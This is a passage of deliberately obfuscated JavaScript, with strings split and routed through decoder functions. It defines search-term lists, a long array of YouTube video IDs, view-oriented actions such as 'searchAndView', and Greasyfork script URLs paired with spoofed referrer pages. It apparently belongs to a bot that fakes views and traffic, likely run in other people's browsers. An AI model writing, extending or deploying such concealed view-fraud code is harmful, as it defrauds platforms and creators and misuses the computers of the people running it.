'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + Y(0x1a) + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x163e + -0x21eb + 0x3833 * 0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x250 * -0xc + -0x18ab + -0x29 * 0x13)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1e53 + -0x1 * -0x1e72 + -0x4 * 0x7);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    Y(0x17) + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    Z(0x1, 'CBDq') + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    Y(0x3) + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + Y(0x11) + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + Y(0x9) + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + Z(0x14, '[)!u'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': Y(0xf) + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + Z(0x1d, 'T*Zw') + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a0(0x13) + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': a0(0x18) + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
